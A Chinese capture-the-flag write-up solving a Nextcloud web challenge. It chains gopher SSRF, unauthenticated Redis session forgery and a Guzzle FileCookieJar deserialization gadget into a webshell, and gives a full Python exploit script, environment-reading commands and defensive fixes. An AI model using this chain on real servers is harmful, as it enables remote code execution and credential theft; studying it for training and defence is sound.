# 强网杯 2026 线上赛 —— ezphp（how 2shell???）Writeup

## 0. 题目与结果

- 题目：`ezphp，how 2shell???`
- 类型：Web
- 容器：`https://eci-2zeg5yhyfoa53aublwjm.cloudeci1.ichunqiu.com:443`
- **动态 Flag**：

```text
flag{08703580-34c3-4281-8298-b041606350e4}
```

> 注意：`/opt/ctf/internal/flag.txt` 里的 `flag{You_are_so_smart_8080}` 是镜像里的**静态诱饵**；
> 真正的动态 flag 由平台注入到容器环境变量 `ICQ_FLAG`，同时写入 `/flag`。

---

## 1. 环境指纹

```http
GET /status.php HTTP/2
```

```json
{
  "installed": true,
  "maintenance": false,
  "needsDbUpgrade": false,
  "version": "34.0.3.2",
  "versionstring": "34.0.3",
  "productname": "Nextcloud"
}
```

```text
Nextcloud 34.0.3.2
PHP 8.5.12
Apache/2.4.69 (Debian)
```

通过 RCE 之后确认了容器内的关键环境：

```text
NEXTCLOUD_TRUSTED_DOMAINS=localhost *
NEXTCLOUD_ADMIN_USER=admin
NEXTCLOUD_ADMIN_PASSWORD=NcCtf-Adm1n-DoNotShare
REDIS_HOST=127.0.0.1
SQLITE_DATABASE=nextcloud
ICQ_FLAG=flag{08703580-34c3-4281-8298-b041606350e4}
```

---

## 2. 第一层：`/flag.php` 的 SSRF 与静态诱饵

web 根目录下存在一个独立文件 `/flag.php`，它不经过 Nextcloud 路由，直接由 Apache 执行。
`GET /flag.php` 会通过 `highlight_file` 把自身源码输出：

```php
<?php
header('Content-Type: text/html; charset=utf-8');

$flag_file = '/opt/ctf/internal/flag.txt';
$remote = $_SERVER['REMOTE_ADDR'] ?? '';

if (in_array($remote, ['127.0.0.1', '::1'], true)) {
    foreach (['HTTP_X_FORWARDED_FOR', 'HTTP_CLIENT_IP', 'HTTP_X_REAL_IP', 'HTTP_FORWARDED'] as $h) {
        if (!empty($_SERVER[$h])) {
            exit('Hacker?');
        }
    }

    if (!preg_match('#^qwb2026#i', $_SERVER['HTTP_USER_AGENT'] ?? '')) {
        exit('Hacker?');
    }

    header('Content-Type: text/plain; charset=utf-8');
    echo trim((string)file_get_contents($flag_file)), PHP_EOL;
    exit;
}

highlight_file(__FILE__);

if (!isset($_REQUEST['url'])) {
    exit;
}
$url = (string)$_REQUEST['url'];

if (preg_match('#(file|dict|ftp|tftp|sftp|ssh|smb|telnet|ldapi|phar|expect|zlib|glob|data|zip):/+#i', $url)) {
    die('Hacker?');
}

if (strpos($url, '\\') !== false || substr_count($url, '@') > 1) {
    die('Hacker?');
}
$host = strtolower(trim((string)parse_url($url, PHP_URL_HOST), '[]'));
if ($host !== '127.0.0.1' && $host !== '::1' && $host !== 'localhost') {
    die('Hacker?');
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'internal-preview/1.0');
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
curl_exec($ch);
```

要点：

- 本地分支（`REMOTE_ADDR` 为 `127.0.0.1`/`::1`）要求：
  - 不能携带 `X-Forwarded-For`、`Client-IP`、`X-Real-IP`、`Forwarded`；
  - `User-Agent` 必须以 `qwb2026` 开头；
  - 满足后读取 `/opt/ctf/internal/flag.txt`。
- 远程分支是 SSRF：
  - 黑名单里**没有 `gopher`**；
  - `parse_url` 的 host 必须是 `127.0.0.1`/`::1`/`localhost`；
  - `curl_exec` 未设置 `CURLOPT_RETURNTRANSFER`，内层响应会直接回显。

### 2.1 gopher 绕过固定 UA（拿到的是诱饵 flag）

直接 SSRF 到 `http://127.0.0.1/flag.php` 会被固定的
`User-Agent: internal-preview/1.0` 拦截。用 gopher 发送自定义原始 HTTP 请求即可：

```python
import requests, urllib.parse
B = "https://eci-2zeg5yhyfoa53aublwjm.cloudeci1.ichunqiu.com"

raw = ("GET /flag.php HTTP/1.1\r\n"
       "Host: 127.0.0.1\r\n"
       "User-Agent: qwb2026-pwn\r\n"
       "Connection: close\r\n\r\n")

gopher = "gopher://127.0.0.1:80/_" + urllib.parse.quote(raw, safe='')
url = B + "/flag.php?url=" + urllib.parse.quote(gopher, safe='')

r = requests.get(url, verify=False, timeout=30)
print(r.text[-200:])
```

得到：

```text
flag{You_are_so_smart_8080}
```

这是镜像里的静态 flag，平台动态 flag 并不在这里。题目名 `how 2shell` 说明还需要拿 shell。

---

## 3. 第二层：Redis 是 PHP session 存储，且未授权可写

`/flag.php` 的 SSRF 允许访问 `127.0.0.1` 的**任意端口**。探测发现：

```text
127.0.0.1:6379  Redis 8.0.2
```

Redis 无密码（`user default on nopass ... +@all`），且 `EVAL` 可用；
`CONFIG`、`KEYS`、`SCAN`、`CLIENT`、`MODULE`、`REPLICAOF` 等危险命令被禁用/重命名。

更关键的是：Nextcloud 用这个 Redis 存 **PHP session**。

先访问 `/login` 拿一个 Nextcloud 会话：

```text
Set-Cookie: ocv17ihrp963=<32位hex sid>
Set-Cookie: oc_sessionPassphrase=<passphrase>
```

然后通过 SSRF 查询 Redis：

```text
GET PHPREDIS_SESSION:<sid>
```

返回：

```text
$420
encrypted_session_data|s:388:"f0baf978...（加密的 session 数据）..."
```

可以得到两点：

1. session key 前缀是 `PHPREDIS_SESSION:`；
2. 序列化格式是 **PHP 原生 `php` handler**（`key|serialized-value`），不是 igbinary。

由于 Redis 未授权可写，攻击者可以把 `PHPREDIS_SESSION:<自己的 sid>` 改成**任意 PHP 序列化字符串**。
下一次带该 sid 访问 Nextcloud 时，PHP 在 `session_start()` 阶段会对其做 `unserialize`，
从而触发 POP gadget 的 `__wakeup` / `__destruct`。

这是整道题真正的利用点：**未授权 Redis → 伪造 PHP session → 反序列化对象注入 → RCE**。

---

## 4. 第三层：用 EVAL 绕过 gopher 的 NUL 字节限制

PHP 私有属性序列化时包含 NUL 字节（`\0Class\0prop`）。
而 gopher URL 中的 `%00` 会被 curl 拒绝，导致 RESET/SET 失败。
解决办法：用 Redis `EVAL`，把 payload 以 **hex 字符串**传入 Lua，
由 Lua 在服务端还原成二进制并写入 session key：

```lua
local h=ARGV[1]
local s=''
for i=1,#h,2 do
  s=s..string.char(tonumber(h:sub(i,i+1),16))
end
redis.call('set',KEYS[1],s)
return 'ok'
```

调用形式：

```text
EVAL "<上面脚本压缩成一行>" 1 PHPREDIS_SESSION:<sid> <payload_hex>
```

发送方式为 gopher 到 `127.0.0.1:6379`：

```python
def ssrf_raw(port, raw: bytes):
    gurl = f"gopher://127.0.0.1:{port}/_" + urllib.parse.quote_from_bytes(raw, safe='')
    url  = B + "/flag.php?url=" + urllib.parse.quote(gurl, safe='')
    return requests.get(url, verify=False, timeout=30).content
```

注意 `gopher` 的分层编码：

- 第一层：RESP 数据做 percent-encode，作为 gopher data；
- 第二层：整个 gopher URL 再作为 `url` 参数做一次 URL 编码。

这样 `$url` 里看到的是 `%5C`、`%00` 等文本，不会命中 `/flag.php` 的
`strpos($url, '\\')` 反斜杠检查；而 curl 解析 gopher 时会再还原成真实字节。

---

## 5. 第四层：Guzzle FileCookieJar 写文件 gadget

Nextcloud 的 `3rdparty` 中自带 Guzzle。
`GuzzleHttp\Cookie\FileCookieJar` 的 `__destruct` 会调用 `save($this->filename)`，
最终执行：

```php
file_put_contents($filename, json_encode($json), LOCK_EX);
```

其中 `$json` 来自 `cookies` 数组里的 `SetCookie`。
我们可以构造序列化对象，把 PHP 代码放在 cookie 的 `Name`/`Value` 字段里。
写出的文件形如：

```json
[{"Name":"<?php system($_GET[0]); ?>","Value":"v",...}]
```

对 PHP 来说，`<?php ... ?>` 之前的内容只是普通输出，因此这个 JSON 文件本身就是可执行 webshell。

### 5.1 类与属性

```text
GuzzleHttp\Cookie\FileCookieJar
  ├── (parent CookieJar) private $cookies
  ├── (parent CookieJar) private $strictMode
  ├── private $filename
  └── private $storeSessionCookies

GuzzleHttp\Cookie\SetCookie
  ├── private $data       // Name/Value/Domain/Path/Max-Age/Expires/Secure/Discard/HttpOnly
  └── private $hostOnly
```

### 5.2 Python 序列化构造

```python
def s(v: bytes):
    return b's:' + str(len(v)).encode() + b':"' + v + b'";'

def i(v):
    return b'i:' + str(v).encode() + b';'

def b(v):
    return b'b:' + (b'1' if v else b'0') + b';'

def arr(items):
    out = b'a:' + str(len(items)).encode() + b':{'
    for k, v in items:
        out += (i(k) if isinstance(k, int) else s(k)) + v
    return out + b'}'

def obj(cls: bytes, props):
    out = b'O:' + str(len(cls)).encode() + b':"' + cls + b'":' + str(len(props)).encode() + b':{'
    for name, val in props:
        out += s(name) + val
    return out + b'}'

def filecookiejar(filename: bytes, cookie_name: bytes, cookie_value: bytes):
    cls_cj = b'GuzzleHttp\\Cookie\\CookieJar'
    cls_fj = b'GuzzleHttp\\Cookie\\FileCookieJar'
    cls_sc = b'GuzzleHttp\\Cookie\\SetCookie'

    data = arr([
        (b'Name', s(cookie_name)),
        (b'Value', s(cookie_value)),
        (b'Domain', s(b'127.0.0.1')),
        (b'Path', s(b'/')),
        (b'Max-Age', b'N;'),
        (b'Expires', i(1)),
        (b'Secure', b(0)),
        (b'Discard', b(0)),
        (b'HttpOnly', b(0)),
    ])
    sc = obj(cls_sc, [
        (b'\x00' + cls_sc + b'\x00data', data),
        (b'\x00' + cls_sc + b'\x00hostOnly', b(0)),
    ])
    cookies = arr([(0, sc)])
    fj = obj(cls_fj, [
        (b'\x00' + cls_cj + b'\x00cookies', cookies),
        (b'\x00' + cls_cj + b'\x00strictMode', b(0)),
        (b'\x00' + cls_fj + b'\x00filename', s(filename)),
        (b'\x00' + cls_fj + b'\x00storeSessionCookies', b(1)),
    ])
    # PHP session 的 php 序列化格式：key|serialized_value
    return b'x|' + fj
```

### 5.3 写入 oracle：覆盖 `data/.htaccess`

为了验证析构函数确实执行、文件确实落地，先把 filename 设成：

```text
/var/www/html/data/.htaccess
```

执行 session 触发后，`/data/` 的响应从原来的 `404` 变成 `500`
（Apache 把 JSON 当成非法 `.htaccess` 指令），说明：

- `FileCookieJar::__destruct` 执行了；
- `file_put_contents` 成功；
- PHP 进程与 Apache 共享同一个文件系统，数据目录位于 `/var/www/html/data`。

---

## 6. 第五层：直接覆盖已存在的可写 PHP 入口拿 RCE

进一步测试发现：

- web 根目录 `/var/www/html` 本身不可新建文件（目录不可写）；
- 但**已存在的 Nextcloud PHP 文件是可写的**（`www-data` 拥有它们）。

因此不需要 data 目录，也不需要更强的 gadget：直接把 `public.php`（或 `cron.php`/`status.php`/`ocs/v1.php`）
覆盖成我们的 JSON webshell 即可。

### 6.1 触发 session_start 的内部请求

外部请求可能被 SLB 分发，最稳妥的方式是用 `/flag.php` 的 SSRF 直接请求
`127.0.0.1:80`，保证触发请求和文件写入在同一个容器：

```python
def http_req(path, cookie, host):
    return (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Cookie: {cookie}\r\n"
        "Connection: close\r\n\r\n"
    ).encode()

cookie = (
    f"ocv17ihrp963={sid}; "
    f"oc_sessionPassphrase={'A'*128}; "
    "nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true"
)

# 触发 Nextcloud 读取并反序列化我们的 session
ssrf_raw(80, http_req("/index.php/login", cookie, HOST))
```

`Host` 要用平台域名（`NEXTCLOUD_TRUSTED_DOMAINS=localhost *`，实际域名也在信任列表里）。

### 6.2 覆盖 public.php

```python
payload = filecookiejar(
    b'/var/www/html/public.php',
    b'<?php system($_GET[0]); ?>',
    b'v',
)
redis_eval_set(b'PHPREDIS_SESSION:' + sid.encode(), payload)
ssrf_raw(80, http_req("/index.php/login", cookie, HOST))
```

然后：

```http
GET /public.php?0=id
```

响应：

```text
[{"Name":"uid=33(www-data) gid=33(www-data) groups=33(www-data)
","Value":"v","Domain":"127.0.0.1","Path":"\/",...}]
```

成功拿到 `www-data` 的命令执行。

---

## 7. 读取动态 Flag

通过 webshell 执行：

```text
env
cat /proc/self/environ
cat /flag
```

得到：

```text
ICQ_FLAG=flag{08703580-34c3-4281-8298-b041606350e4}
```

`/flag` 内容同样为：

```text
flag{08703580-34c3-4281-8298-b041606350e4}
```

而 `/opt/ctf/internal/flag.txt` 中的 `flag{You_are_so_smart_8080}` 只是静态诱饵。

---

## 8. 整合利用脚本

以下脚本按顺序完成：

1. 取一个 Nextcloud session（sid 与会话 cookie 名）；
2. 通过 `/flag.php` 的 SSRF 连接 Redis；
3. 用 `EVAL` + hex 写入 FileCookieJar 反序列化 payload；
4. 通过内部 HTTP 请求触发 `session_start` / `__destruct`；
5. 覆盖 `public.php` 为 webshell；
6. 通过 webshell 执行命令并读取 flag。

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re
import json
import urllib.parse

import requests
import urllib3

urllib3.disable_warnings()

BASE = "https://eci-2zeg5yhyfoa53aublwjm.cloudeci1.ichunqiu.com"
HOST = "eci-2zeg5yhyfoa53aublwjm.cloudeci1.ichunqiu.com"


# ---------- 基础 SSRF：gopher -> 127.0.0.1:port ----------
def ssrf_raw(port: int, raw: bytes, timeout: int = 30) -> bytes:
    gurl = f"gopher://127.0.0.1:{port}/_" + urllib.parse.quote_from_bytes(raw, safe="")
    url = BASE + "/flag.php?url=" + urllib.parse.quote(gurl, safe="")
    r = requests.get(url, verify=False, timeout=timeout)
    marker = b"</code></pre>"
    i = r.content.find(marker)
    return r.content[i + len(marker):] if i >= 0 else r.content


# ---------- Redis：EVAL + hex 还原二进制，写入 session ----------
def redis_eval_set(key: bytes, value: bytes) -> bytes:
    hexv = value.hex()
    script = (
        "local h=ARGV[1] "
        "local s='' "
        "for i=1,#h,2 do s=s..string.char(tonumber(h:sub(i,i+1),16)) end "
        "redis.call('set',KEYS[1],s) "
        "return 'ok'"
    )
    cmd = f'EVAL "{script}" 1 {key.decode()} {hexv}'.encode() + b"\r\n"
    return ssrf_raw(6379, cmd)


# ---------- PHP 序列化辅助 ----------
def pstr(v: bytes) -> bytes:
    return b"s:" + str(len(v)).encode() + b':"' + v + b'";'


def pint(v: int) -> bytes:
    return b"i:" + str(v).encode() + b";"


def pbool(v: bool) -> bytes:
    return b"b:" + (b"1" if v else b"0") + b";"


def parr(items) -> bytes:
    out = b"a:" + str(len(items)).encode() + b":{"
    for k, v in items:
        out += (pint(k) if isinstance(k, int) else pstr(k)) + v
    return out + b"}"


def pobj(cls: bytes, props) -> bytes:
    out = (
        b'O:' + str(len(cls)).encode() + b':"' + cls + b'":'
        + str(len(props)).encode() + b":{"
    )
    for name, val in props:
        out += pstr(name) + val
    return out + b"}"


# ---------- Guzzle FileCookieJar 写文件 gadget ----------
def filecookiejar(filename: bytes, code: bytes) -> bytes:
    cls_cj = b"GuzzleHttp\\Cookie\\CookieJar"
    cls_fj = b"GuzzleHttp\\Cookie\\FileCookieJar"
    cls_sc = b"GuzzleHttp\\Cookie\\SetCookie"

    data = parr([
        (b"Name", pstr(code)),
        (b"Value", pstr(b"v")),
        (b"Domain", pstr(b"127.0.0.1")),
        (b"Path", pstr(b"/")),
        (b"Max-Age", b"N;"),
        (b"Expires", pint(1)),
        (b"Secure", pbool(False)),
        (b"Discard", pbool(False)),
        (b"HttpOnly", pbool(False)),
    ])
    cookie = pobj(cls_sc, [
        (b"\x00" + cls_sc + b"\x00data", data),
        (b"\x00" + cls_sc + b"\x00hostOnly", pbool(False)),
    ])
    cookies = parr([(0, cookie)])
    fj = pobj(cls_fj, [
        (b"\x00" + cls_cj + b"\x00cookies", cookies),
        (b"\x00" + cls_cj + b"\x00strictMode", pbool(False)),
        (b"\x00" + cls_fj + b"\x00filename", pstr(filename)),
        (b"\x00" + cls_fj + b"\x00storeSessionCookies", pbool(True)),
    ])
    return b"x|" + fj


# ---------- Nextcloud 会话 ----------
def get_session():
    s = requests.Session()
    s.verify = False
    s.get(BASE + "/login", timeout=20)
    sid = None
    sess_name = None
    for c in s.cookies:
        if c.name.startswith("oc") and c.name != "oc_sessionPassphrase" and re.fullmatch(r"[0-9a-f]{32}", c.value or ""):
            sid = c.value
            sess_name = c.name
    return sid, sess_name


def internal_http(path: str, sid: str, sess_name: str) -> bytes:
    cookie = (
        f"{sess_name}={sid}; "
        f"oc_sessionPassphrase={'A' * 128}; "
        "nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true"
    )
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"Cookie: {cookie}\r\n"
        "Connection: close\r\n\r\n"
    ).encode()
    return ssrf_raw(80, req)


def exploit():
    sid, sess_name = get_session()
    assert sid and sess_name, "failed to get Nextcloud session"
    print("[*] sid =", sid, "session name =", sess_name)

    # 用 FileCookieJar 覆盖已存在的 public.php 为 webshell
    payload = filecookiejar(b"/var/www/html/public.php", b"<?php system($_GET[0]); ?>")
    print("[*] write session payload:", redis_eval_set(b"PHPREDIS_SESSION:" + sid.encode(), payload)[:20])

    # 触发 session_start -> 反序列化 -> __destruct -> file_put_contents
    print("[*] trigger:", internal_http("/index.php/login", sid, sess_name)[:15])

    # 执行命令
    r = requests.get(BASE + "/public.php", params={"0": "id; echo ---; env"}, verify=False, timeout=30)
    print(r.text)


if __name__ == "__main__":
    exploit()
```

拿到 shell 后读取动态 flag：

```text
GET /public.php?0=env
GET /public.php?0=cat%20/flag
```

```text
ICQ_FLAG=flag{08703580-34c3-4281-8298-b041606350e4}
```

---

## 9. 为什么这条链成立

1. **`/flag.php` 不是终点**：它的 SSRF 只回显 `/opt/ctf/internal/flag.txt`，而该文件是静态诱饵；
   真正的动态 flag 在容器环境变量 `ICQ_FLAG` 和 `/flag` 中。
2. **SSRF 的 host 限制（127.0.0.1/::1/localhost）反而帮了忙**：
   可以直接访问容器内的 Redis 与 Apache，绕过外部 SLB 的副本分发。
3. **Redis 未授权且是 PHP session 存储**：
   攻击者可以按 `PHPREDIS_SESSION:<sid>` 写入任意序列化数据。
4. **`php` session 序列化允许对象**：
   Nextcloud 在 `session_start()` 时对 session 数据做 `unserialize`，
   因此可以触发 Guzzle `FileCookieJar` 的 `__destruct`。
5. **FileCookieJar 的 JSON 输出可以直接当 webshell**：
   PHP 只执行 `<?php ... ?>` 内的代码，JSON 前后缀只是普通输出；
   把目标设成已存在且可写的 `public.php` 即可执行。
6. **动态 flag 的读取**：
   以 `www-data` 执行 `env` / `cat /flag` 即可拿到平台注入的 `ICQ_FLAG`。

---

## 10. 修复建议

1. **Redis 不要暴露给应用容器本地且无认证**：
   - 设置 `requirepass` / ACL；
   - 禁止 `EVAL`/`FUNCTION`/`RESTORE` 等命令；
   - 不要把 Redis 绑定到 `127.0.0.1` 后仍允许应用层 SSRF 访问。
2. **不要用 PHP 原生 session 序列化存储不可信数据**：
   - 使用 `session.serialize_handler=php_serialize`；
   - 或使用签名/加密的 session 数据；
   - 确保 session 存储（Redis）不可被未授权写入。
3. **限制 session id 的可预测/可注入性**：
   - `session.use_strict_mode=1`；
   - 服务端 session 与客户端输入严格隔离。
4. **SSRF 黑名单不可靠**：
   - 使用协议白名单（只允许 http/https）与 curl `CURLOPT_PROTOCOLS`；
   - 禁止 `gopher`、`dict`、`file` 等协议；
   - 解析后校验 IP，禁止回环/私网/链路本地地址。
5. **web 根目录不要保留可写文件**：
   - 代码目录只读；
   - 敏感入口文件（`public.php`、`status.php` 等）设置为不可写；
   - 避免 `www-data` 对 webroot 内 PHP 文件有写权限。
6. **不要在容器环境中复用高价值凭据**：
   本例中 `NEXTCLOUD_ADMIN_PASSWORD`、`ICQ_FLAG` 均直接存在于进程环境，
   拿到任意命令执行即可读取。

---

## 11. 新手向：这题到底难在哪？涉及哪些知识点？需要什么技能？

> 这一节假设你几乎没有 Web 安全基础。看不懂前面的利用代码没关系，
> 先看这一节，把“这道题在干什么”建立起来，再回头读前面的细节。

### 11.1 用一句大白话说完整条链

这道题的利用过程可以概括成：

```text
flag.php 的 SSRF
   → 打到服务器本机的 Redis
   → 改写服务器上的 PHP session
   → 触发 PHP 反序列化
   → 利用 Guzzle 现成类的“析构函数”写文件
   → 覆盖一个已存在的 PHP 页面
   → 在服务器上执行命令
   → 读取环境变量里的动态 flag
```

注意：**没有任何一步单独看是“直接 RCE”**。
每一步只拿到一个小能力（能访问内网、能写 Redis、能写文件、能执行一个文件……），
难的是把这些小能力**按正确顺序串起来**。

### 11.2 这道题真正的难点

#### 难点一：入口不等于终点，静态 flag 是诱饵

`/flag.php` 的自带 SSRF 确实能读到 `/opt/ctf/internal/flag.txt`，
但里面是镜像里写死的 `flag{You_are_so_smart_8080}`，不是平台下发的动态 flag。

很多新手会在这里停下，以为已经做完了。
真正的动态 flag 在容器环境变量 `ICQ_FLAG` 和根目录 `/flag` 里，
必须拿到**命令执行**才能读。

> 这类题的第一个考点就是：**不要看到一个 flag 就交，先判断它是不是平台 flag。**

#### 难点二：要跨多个技术栈

这道题同时涉及：

- HTTP / SSRF / gopher
- Redis（未授权访问、RESP 协议、Lua）
- PHP session（cookie、sid、session 存储、序列化格式）
- PHP 反序列化与 POP gadget（魔术方法、对象注入）
- Linux 文件权限（目录写权限 vs 文件写权限）
- Apache 的 `.htaccess`
- 反向代理 / 负载均衡（SLB）对请求分发的影响

任何一块完全不懂，链子就断了。

#### 难点三：每一步都有一个小坑，需要验证和绕过

| 步骤 | 新手以为 | 实际上的坑 |
| --- | --- | --- |
| SSRF | 直接 `file://` 读文件 | 黑名单禁了 `file`，但漏了 `gopher` |
| gopher 打 Redis | 直接拼 RESP 发过去 | PHP 私有属性需要 `\0`，而 gopher URL 里的 `%00` 会被 curl 拒绝 |
| 伪造 session | 随便写个 key 就行 | 要用 `PHPREDIS_SESSION:<sid>`，sid 和会话名都要对 |
| 反序列化 | `unserialize()` 就是还原数组 | 私有属性名必须是 `\0类名\0属性名`，否则属性根本没被设置 |
| 写 webshell | 直接写 `/var/www/html/shell.php` | 目录不可写；但**已存在**的 PHP 文件可写，于是改成覆盖 `public.php` |
| 触发写入 | 外部请求一下就行 | SLB 可能把请求分发到不同副本，必须用内部 `127.0.0.1` 请求保证同一容器 |

#### 难点四：需要“验证性思维”

比如：你怎么知道 `FileCookieJar` 的析构函数真的执行了？

做法是找一个**可观察的副作用**：

```text
把 /var/www/html/data/.htaccess 覆盖成 JSON
    → 再访问 /data/
    → 状态码从 404 变成 500
    → 证明“文件确实被写进去了，而且 Apache 读到了它”
```

这种“通过差异反推内部状态”的东西，通常叫 **oracle（探针/判断器）**。
做复杂题时，**先设计一个能验证假设的 oracle**，比盲目试 payload 重要得多。

#### 难点五：动态 flag 的机制

强网杯的 flag 是**每队/每容器不同**的动态 flag，常见放置方式：

```text
环境变量 ICQ_FLAG=flag{...}
文件 /flag
```

所以拿到 shell 后，要做的不是“找 flag.php”，而是：

```text
env
cat /proc/self/environ
cat /flag
```

### 11.3 涉及的知识点（从零解释）

#### 1）SSRF 是什么？

SSRF（Server-Side Request Forgery，服务端请求伪造）就是：
**让服务器替你去访问一个 URL**。

本题里：

```php
$url = $_REQUEST['url'];
curl_setopt($ch, CURLOPT_URL, $url);
curl_exec($ch);
```

服务器会用 curl 去请求你给的 URL。
限制是“只能请求 `127.0.0.1` / `::1` / `localhost`”——
看起来是防御，实际上反而让你能打到服务器本机的服务。

#### 2）gopher 是什么？

`gopher://` 是一种“可以自己拼原始 TCP 数据”的协议。

普通 `http://` 只能发合法的 HTTP 请求；
而 gopher 可以让你把要发送的**原始字节**（包括 HTTP 报文的每一行）写进 URL，
libcurl 会把这些字节原样发给目标端口。

于是：

```text
gopher://127.0.0.1:6379/_<RESP 命令>
```

就能直接和 Redis 说话；

```text
gopher://127.0.0.1:80/_<原始 HTTP 请求>
```

就能自定义 `User-Agent`、`Cookie` 等所有请求头。

本题的黑名单里有 `file|dict|ftp|...|data|zip`，**唯独没有 `gopher`**，
这就是 SSRF 的突破口。

#### 3）Redis 是什么？为什么未授权很危险？

Redis 是一个“内存里的字典”（key-value 数据库），默认监听 6379。
如果没有设置密码，任何人连上都能读写。

本题里 Redis 被 Nextcloud 用来存 **PHP session**：

```text
key   = PHPREDIS_SESSION:<session_id>
value = 序列化后的 session 数据
```

因为 Redis 未授权，攻击者可以**直接改写自己的 session 内容**。

#### 4）PHP session 是什么？

浏览器登录后，服务器会给浏览器一张“会员卡”（Cookie 里的 session id）。
服务器根据这个 id 找到对应的 session 数据。

本题的 session 数据是 PHP 原生序列化格式：

```text
变量名|序列化后的值
```

例如：

```text
encrypted_session_data|s:388:"...加密数据..."
```

关键的坑：**PHP session 在 `session_start()` 时会执行 `unserialize()`**。
如果 session 数据里有一个对象（`O:...`），PHP 就会把这个对象**还原出来**。

#### 5）PHP 序列化 / 反序列化是什么？

`serialize()` 把对象变成字符串，`unserialize()` 把字符串变回对象。

对象序列化大概长这样：

```text
O:长度:"类名":属性个数:{属性名;属性值;...}
```

例如：

```text
O:11:"Archive_Tar":2:{s:13:"_temp_tarname";s:28:"/path";s:5:"_file";N;}
```

本题里有两个关键点：

1. **私有属性**的名字要写成 `\0类名\0属性名`（含有 NUL 字节）；
2. 反序列化时，如果类存在，PHP 会把对象真正创建出来。

#### 6）魔术方法 / POP gadget 是什么？

PHP 类里有一些“自动触发”的函数，叫魔术方法，例如：

- `__destruct()`：对象被销毁时自动执行；
- `__wakeup()`：反序列化时自动执行。

**POP chain（gadget chain）** 就是：
利用程序里**现成的类**，让反序列化“自动”触发一串方法调用，最终达到危险操作。

本题用了两个现成类：

- `GuzzleHttp\Cookie\FileCookieJar`
  - `__destruct()` → `save()` → `file_put_contents()`
  - 效果：**把可控内容写到指定路径**。
- `Archive_Tar`
  - `__destruct()` → `_close()` → `unlink($this->_temp_tarname)`
  - 效果：**删除任意文件**。

#### 7）为什么 JSON 文件也能当 webshell？

`FileCookieJar` 写出来的内容是 JSON：

```json
[{"Name":"<?php system($_GET[0]); ?>","Value":"v",...}]
```

PHP 解析 `.php` 文件时，只执行 `<?php ... ?>` 里面的代码；
标签外面的 `[{"Name":"` 只是普通文本输出。

所以只要这个文件被 PHP 执行，里面的 `system()` 就会运行。

#### 8）Linux 文件权限：目录写 vs 文件写

这是本题非常关键、但新手最容易忽略的一点：

- **在一个目录里新建文件**：需要目录的“写”权限；
- **覆盖一个已存在的文件**：只需要那个文件本身的“写”权限。

本题里：

```text
/var/www/html/           目录不可写  → 建不了 shell.php
/var/www/html/public.php 文件可写    → 可以覆盖成 webshell
```

所以最后不是“新建 webshell”，而是“覆盖现成的 PHP 入口文件”。

#### 9）反向代理 / SLB 的影响

平台前面通常有负载均衡（SLB）。外部请求可能被分发到不同副本，
而文件写入是“副本本地”的。

所以触发写入、读取 webshell 时，尽量用 SSRF 直接请求：

```text
127.0.0.1:80
127.0.0.1:6379
```

这样能保证“触发请求”和“读取请求”在同一个容器里。

### 11.4 掌握这道题需要什么技能？

按重要性排序：

1. **能看懂 PHP 代码**
   - 知道类、属性、方法、魔术方法；
   - 知道 `serialize/unserialize` 的字符串格式。

2. **会写一点 Python**
   - 用 `requests` 发请求；
   - 处理 URL 编码、二进制、Cookie。

3. **理解 HTTP**
   - 请求行、请求头、请求体；
   - `Host`、`Cookie`、`User-Agent` 的作用；
   - 状态码与重定向。

4. **理解 Redis 基本用法**
   - `GET/SET`、`EVAL`、key 的命名；
   - 什么是未授权 Redis。

5. **理解 Linux 基础权限**
   - 读/写/执行权限；
   - 目录权限和文件权限的区别。

6. **会做黑盒探测和假设验证**
   - 端口探测、协议指纹；
   - 用响应差异做 oracle；
   - 记录“什么试过了、为什么失败”。

7. **耐心和链式思维**
   - 单点失败不代表全盘失败；
   - 学会把一个小原语接到另一个小原语上。

### 11.5 给新手的学习路径

1. 先在靶场练 SSRF 基础（`file://`、`http://`、`gopher://`、localhost 绕过）。
2. 学 PHP 面向对象，自己写一个带 `__destruct()` 的类，
   用 `serialize()`/`unserialize()` 观察它什么时候执行。
3. 学 PHPGGC 的思路（不一定要直接用工具，理解“找 gadget”的方法）。
4. 学 Redis 基础命令和 RESP 协议，理解未授权 Redis 的危害。
5. 学 Apache `.htaccess` 和 Linux 文件权限。
6. 用 Docker 在**本地**搭一个 Nextcloud + Redis 环境复现本题
   （注意：只在本地或已授权的环境练习）。
7. 做 CTF 时养成两个习惯：
   - 每验证一个假设，就记录“证据”；
   - 每失败一次，就问“它到底拦住了什么？我能不能换一层编码/换一个入口？”

### 11.6 新手常见误区

- ❌ 看到 `/opt/ctf/internal/flag.txt` 里的 flag 就交了（静态诱饵）。
- ❌ 以为 SSRF 只能 `file://` 读文件（黑名单）。
- ❌ 以为 Redis 未授权就一定能 `CONFIG SET dir` 写 webshell（本题命令被禁用）。
- ❌ 直接写 `/var/www/html/shell.php` 失败就放弃（目录不可写，但可覆盖已有文件）。
- ❌ 序列化私有属性时忘了 `\0类名\0属性名`，导致对象属性没被设置。
- ❌ 外部请求和内部请求打到不同副本，导致“明明写了却访问不到”。
- ❌ 忘记 session 名/instanceid，导致 Redis key 写错位置。

### 11.7 一句话总结

这道题不是考某一个 CVE，而是考：

> **把一个 SSRF、一个未授权 Redis、一个 PHP 反序列化 gadget、
> 一个文件写权限问题，按正确顺序串成一条链，并且知道真正的动态 flag 在哪里。**

能把这条链独立复现出来，说明你已经具备 Web 渗透里非常核心的
“信息收集 → 假设 → 验证 → 链式利用”能力。
